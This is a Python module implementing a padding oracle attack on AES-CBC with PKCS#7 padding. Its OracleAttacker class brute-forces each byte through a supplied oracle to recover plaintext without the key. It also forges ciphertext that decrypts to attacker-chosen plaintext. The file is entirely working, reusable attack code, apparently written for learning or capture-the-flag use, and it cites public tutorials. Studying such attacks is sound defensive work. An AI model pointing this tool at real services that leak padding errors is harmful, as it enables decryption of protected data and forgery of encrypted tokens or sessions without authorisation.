
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import binascii
"""
Module to perform padding oracle attack on CBC mode with PKCS#7.
Oracle is a python object with decrypt_block method implemented, which returns true if padding for
decrypted target block is correct and false otherwise.
For attack description, please refer to:
https://robertheaton.com/2013/07/29/padding-oracle-attack/
or 
https://blog.skullsecurity.org/2013/padding-oracle-attacks-in-depth
"""

class OracleAttacker:
    OBJ_NAME = 'Oracle Attacker'

    def __init__(self, oracle, logger):
        """
        :param oracle: oracle object with decrypt_block method implemented
        :param logger: logger object with log level set and 2 levels of verbosity
        """
        self.oracle = oracle
        self.logger = logger
        self.logger.set_owner_name(self.OBJ_NAME)


    def find_byte(self, index, target_block, crafted_block):
        """
        Finds byte at position index in crafted_block that produces correct padding for target_block.
        Does so by querying oracle with all possible values.
        :param index: position of byte within blocks that is being examined
        :param target_block: block that is being decrypted
        :param crafted_block: block that contains bytes that yield correct padding for current index
        :return: byte that yields correct padding for given parameters
        """
        valid = []

        self.logger.info("\tattacking byte [{}/{}]...".format(index+1, len(target_block)))

        for c in range(256):
            crafted_block[index] = c

            self.logger.debug('\ttrying byte {} .. in {} '.format(hex(c), binascii.hexlify(crafted_block)))

            if self.oracle.decrypt_block(bytes(crafted_block), target_block):
                valid.append(c)
                self.logger.info('\t\tpadding correct for {}!!!'.format(hex(c)))
                if index < len(target_block) - 1:
                    break

        counter = 0
        while len(valid) > 1:
            # in case plain text block contains byte 0x02 at [-2] or 0x03 at both [-2] [-3],
            # need to check which of the bytes that yield correct padding is the one that yields 0x01
            # do so by trying to decrypt the same block with different preceeding byte
            # - only 0x01 will yield correct padding

            counter = counter +1
            new_valid = []
            crafted_block[index-1] = counter

            for byte in valid:
                crafted_block[index] = byte

                if self.oracle.decrypt_block(bytes(crafted_block), target_block):
                    new_valid.append(byte)

            valid = new_valid

        return valid[0]


    def get_intermediate_state(self, target_block):
        """
        Extracts intermediate state of target_block when decrypted by oracle.
        Uses find_byte
        :param target_block: cipher text block
        :return: bytearray with intermediate state of target block when decrypted by oracle
        """
        self.logger.info('extracting intermediate state for {}\n'.format(binascii.hexlify(target_block)))

        block_len = len(target_block)
        crafted = bytearray(block_len*b'\xff')
        intermediate = bytearray(block_len*b'\x00')

        pad_byte = 0x01
        for i in reversed(range(block_len)):
            crafted_byte = self.find_byte(i, target_block, crafted)
            intermediate[i] = crafted_byte ^ pad_byte
            pad_byte += 1
            for j in range(i,block_len):
                crafted[j] = intermediate[j] ^ pad_byte

        self.logger.info('intermediate state found: {}\n'.format(binascii.hexlify(intermediate)))
        return intermediate


    def decrypt_block(self, target_block, predecessor):
        """
        Performs padding oracle attack on single block (target_block).
        Uses get_intermediate_state to find the intermediate state, then
        XORs with original preceeding cipher text block to obtain plain text
        :param target_block: block to be decrypted
        :param predecessor: target block preceeding block used to retrieve plain text
        :return:
        """
        #maybe add check if target_block a predecessor are the same length

        self.logger.info('attacking block ... {}'.format(binascii.hexlify(target_block)))

        block_len = len(target_block)
        intermediate = self.get_intermediate_state(target_block)
        result = bytearray(block_len*b'\x00')
        for i,c in enumerate(intermediate):
            result[i] = predecessor[i] ^ c

        return result

    def encrypt_block(self, target_block, plain_text_block):
        """
        Creates predecessor for target_block such that it decrypts to specified plain_text.
        Uses get_intermediate_state to find the intermediate state, then
        XORs plain_text_block to obtain the preceeding cipher text block that
        produces plain_text_block. The transformation is the same as with
        decryption.
        :param target_block:
        :param plain_text:
        :return:
        """
        return self.decrypt_block(target_block, plain_text_block)

    def attack_oracle(self, cipher_text, block_size=16):
        """
        Retrieves plain_text attacking oracle with padding oracle attack.
        cipher_text should be prepended with IV, otherwise the first block cannot be decrypted.
        :param cipher_text: bytes of cipher text to decrypt
        :param oracle: working oracle with defined decrypt_block method as in Oracle.py
        :param block_size: block size of the underlying cipher used (16 by default)
        :return: bytearray containing plain text
        """
        if len(cipher_text) % block_size != 0:
            self.logger.error('cipher text length not a multiple of block size')
            return

        blocks = [cipher_text[i*block_size:i*block_size + block_size] for i in range(len(cipher_text)//block_size)]

        self.logger.info('starting decryption of ciphertext consisting of {} blocks\n\n'.format(len(blocks)))

        plain_text = bytearray()
        for i, block in enumerate(blocks):
            if i > 0:
                plain_text += self.decrypt_block(block, blocks[i-1])
                self.logger.info('successfully decrypted so far: {}\n'.format(plain_text))

        return plain_text

    def encrypt_plaintext(self, plain_text, block_size=16):
        """
        creates cipher text (preceeded with iv) that decrypts
        to target plain text at oracle
        :param plain_text: plain_text to encrypt
        :param block_size: block size of attacked cipher (16 by default)
        :return: tuple (iv, cipher_text)
        """
        if len(plain_text) % block_size != 0:
            plain_text = pad(plain_text, block_size)
            self.logger.warn('plain text length not a multiple of block size, padding applied')

        blocks = [plain_text[i*block_size:(i+1)*block_size] for i in range(len(plain_text)//block_size)]

        self.logger.info('starting encryption of plaintext consisting of {} blocks\n\n'.format(len(blocks)))

        cipher_text = bytearray(block_size*b'\xff')
        for i, block in enumerate(reversed(blocks)):
            if i < len(blocks):
                cipher_text = self.encrypt_block(cipher_text[:block_size], block) + cipher_text

        return cipher_text[:block_size], cipher_text[block_size:]
